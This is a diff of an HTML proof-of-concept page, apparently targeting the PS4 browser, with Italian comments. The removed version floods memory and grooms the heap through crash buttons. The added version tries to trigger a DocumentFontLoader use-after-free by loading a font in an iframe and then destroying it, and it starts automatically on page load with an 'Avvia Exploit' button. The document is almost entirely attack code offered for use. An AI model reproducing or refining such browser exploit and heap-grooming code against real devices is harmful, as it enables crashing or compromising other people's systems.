@@ -1,108 +1,63 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>PS4 Crash Test</title>
-<style>
-    body, html {
-        height: 100%;
-        margin: 0;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        flex-direction: column;
-    }
-    button {
-        font-size: 30px;
-        padding: 15px 30px;
-        border: none;
-        background-color: #007BFF;
-        color: white;
-        cursor: pointer;
-        border-radius: 10px;
-        margin: 10px;
-    }
-    button:hover {
-        background-color: #0056b3;
-    }
-    #divMsg {
-        margin-top: 20px;
-        font-size: 20px;
-    }
-</style>
-<script>
-function log(message) {
-    document.getElementById('msg').innerHTML += `<p>${message}</p>`;
-}
-
-function stringOverflow() {
-    let largeString = "A".repeat(1e6); // Inizia con una stringa di grandi dimensioni
-    log("Iniziando string overflow...");
-    try {
-        while (true) {
-            largeString += largeString; // Raddoppia ripetutamente la stringa
+    <title>PoC Use-After-Free</title>
+    <style>
+        /* Caricamento font vulnerabile */
+        @font-face {
+            font-family: 'uaf';
+            src: url(a.ttf);
         }
-    } catch (e) {
-        log("Errore catturato: " + e.message);
-    }
-}
-
-function heapOverflow() {
-    let heapObjects = [];
-    log("Avvio overflow di heap...");
-    try {
-        while (true) {
-            heapObjects.push(new ArrayBuffer(1e6)); // Alloca blocchi da 1MB
+        body {
+            font-family: 'uaf';
         }
-    } catch (e) {
-        log("Errore catturato: " + e.message);
-    }
-}
+    </style>
+    <script>
+        // Funzione per forzare il caricamento del font
+        function triggerUAF() {
+            try {
+                // Crea un iframe per isolare il contesto
+                let iframe = document.createElement('iframe');
+                document.body.appendChild(iframe);
+                
+                // Carica il font in una nuova finestra
+                let doc = iframe.contentDocument;
+                let style = doc.createElement('style');
+                style.textContent = `
+                    @font-face {
+                        font-family: 'uaf';
+                        src: url('a.ttf');
+                    }
+                    body {
+                        font-family: 'uaf';
+                    }
+                `;
+                doc.head.appendChild(style);
+                doc.body.innerHTML = "<div>Loading...</div>";
 
-function memoryExhaustion() {
-    let objects = [];
-    log("Avvio esaurimento memoria...");
-    try {
-        for (let i = 0; i < 1e7; i++) {
-            objects.push({ index: i, data: "A".repeat(1e4) }); // Riempie la memoria con oggetti
+                // Distruggi l'iframe per forzare il GC (Garbage Collection)
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                    console.log("Iframe distrutto, possibile trigger UAF.");
+                }, 10);
+
+                alert("Font trigger completato!");
+            } catch (e) {
+                console.error("Errore: ", e);
+            }
         }
-    } catch (e) {
-        log("Memoria esaurita o errore catturato: " + e.message);
-    }
-}
 
-function groomHeap() {
-    let buffers = [];
-    log("Grooming heap...");
-    try {
-        for (let i = 0; i < 1024; i++) {
-            buffers.push(new ArrayBuffer(250000)); // Heap grooming con blocchi uniformi
-        }
-    } catch (e) {
-        log("Errore durante il grooming: " + e.message);
-    }
-}
-
-function triggerCrash() {
-    log("Tentativo di crash...");
-    setTimeout(() => stringOverflow(), 1000); // Sovraccarico stringhe dopo 1s
-    setTimeout(() => heapOverflow(), 2000);  // Sovraccarico heap dopo 2s
-    setTimeout(() => memoryExhaustion(), 3000); // Esaurimento memoria dopo 3s
-}
-</script>
+        // Avvia l'exploit
+        window.onload = function() {
+            alert("Avvio PoC Use-After-Free");
+            triggerUAF();
+        };
+    </script>
 </head>
 <body>
-<div style="position: fixed; bottom: 0; left: 0; font-size: small; color: black; padding: 10px; background-color: white;">
-    Creato per PS4 Test - Usa a tuo rischio
-</div>
-
-<button onclick="stringOverflow()">String Overflow</button>
-<button onclick="heapOverflow()">Heap Overflow</button>
-<button onclick="memoryExhaustion()">Memory Exhaustion</button>
-<button onclick="groomHeap()">Groom Heap</button>
-<button onclick="triggerCrash()">Trigger Full Crash</button>
-
-<div id="msg"></div>
+    <h1>PoC DocumentFontLoader UAF</h1>
+    <button onclick="triggerUAF()" style="background-color: blue; color: white; padding: 10px;">
+        Avvia Exploit
+    </button>
 </body>
 </html>
